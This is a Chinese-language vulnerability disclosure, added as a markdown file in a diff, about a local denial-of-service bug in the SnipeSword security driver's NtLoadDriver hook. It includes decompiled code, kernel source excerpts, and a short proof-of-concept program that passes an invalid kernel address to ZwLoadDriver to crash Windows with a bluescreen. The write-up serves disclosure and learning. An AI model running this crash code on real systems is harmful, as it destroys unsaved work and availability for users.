@@ -1,0 +1,118 @@
+
+# 狙剑 SnipeSword.sys NtLoadDriver Hook 本地拒绝服务漏洞
+
+> 原文：[`www.pediy.com/kssd/pediy11/117482.html`](https://www.pediy.com/kssd/pediy11/117482.html)
+
+产品版本：狙剑 V2008-0417
+
+文件版本：`SnipeSword.sys` CheckSum:`00019735`
+
+问题：
+
+在 `NtLoadDriver` HOOK 函数中，对参数检查不够严格，就将参数传递给系统的 `ZwXxx` 函数，结果引发蓝屏。
+
+关键代码
+
+代码:
+
+```
+MyNtLoadDriver:
+......
+sub_17BBB(DriverServiceName, &v26, "ImagePath");
+......
+```
+
+代码:
+
+```
+sub_17BBB:
+......
+ObjectAttributes.Length = 24;
+ObjectAttributes.RootDirectory = 0;
+ObjectAttributes.Attributes = 64;
+ObjectAttributes.SecurityDescriptor = 0;
+ObjectAttributes.ObjectName = DriverServiceName;
+ObjectAttributes.SecurityQualityOfService = 0;
+if (!ZwOpenKey(&Handle, 1u, &ObjectAttributes))
+......
+```
+
+可见在 `sub_17BBB` 中，没有验证参数的正确性就直接调用了 `ZwOpenKey`,
+
+接着我们看下 `NtOpenKey` 的代码(参考 WRK)
+
+代码:
+
+```
+try {
+
+    if (mode == UserMode) {
+        PUNICODE_STRING SafeObjectName;
+
+        ProbeAndZeroHandle(KeyHandle);
+        //
+        // probe the ObjectAttributes as we shall use it for tracing
+        //
+        ProbeForReadSmallStructure( ObjectAttributes,
+                                    sizeof(OBJECT_ATTRIBUTES),
+                                    PROBE_ALIGNMENT(OBJECT_ATTRIBUTES) );
+        SafeObjectName = ObjectAttributes->ObjectName;
+        ProbeAndReadUnicodeStringEx(&CapturedObjectName,SafeObjectName);
+        ProbeForRead(
+            CapturedObjectName.Buffer,
+            CapturedObjectName.Length,
+            sizeof(WCHAR)
+            );
+
+    } else {
+        CapturedObjectName = *(ObjectAttributes->ObjectName);
+    }
+
+    // hook it for WMI
+    HookKcbFromHandleForWmiCmTrace(ObjectAttributes->RootDirectory);
+
+}
+```
+
+由于调用的是 Zw 系列函数,这些函数会把 "前一模式" 设置为 "内核模式"
+
+这样系统函数将不会再对 `ObjectAttributes` 的所有参数做任何有效性检查，而是直接访问其地址
+
+所以系统将直接执行 `CapturedObjectName = *(ObjectAttributes->ObjectName);`这一句,所以我们只要构造一个非法的地址就可以触发异常.
+
+可是系统有使用 SEH 来捕捉异常,也就是说我们使用的用户地址触发的异常会被 SEH 捕捉到
+
+但是,可惜的是
+
+尽管函数内使用了 SEH，但是只要传递错误的内核地址，仍然会引发系统崩溃。
+
+测试代码：
+
+代码:
+
+```
+int main(int argc, char* argv[])
+{
+printf("狙剑 0day  By 单行\n");
+printf("请保存好你的数据,按下回车键后激活 0day\n");
+getchar();
+
+GetProcAddress(GetModuleHandle("ntdll.dll"),"ZwLoadDriver");
+__asm
+{
+    push 0x80000000
+    call eax
+}
+return 0 ;
+}
+```
+
+以上代码在狙剑运行后可以触发蓝屏
+
+此文章多处地方参考(抄袭)了 MJ 博客里面的文章,希望 MJ 大大不要见怪
+
+另外要在这里特别感谢群里的大大,紫色秋枫,......在这方面对我的指导
+
+小弟我初学 0DAY，文章中如有错误之处，希望各位大大们及时指出,
+
+另外各位大大们别喷我，我只是个菜鸟
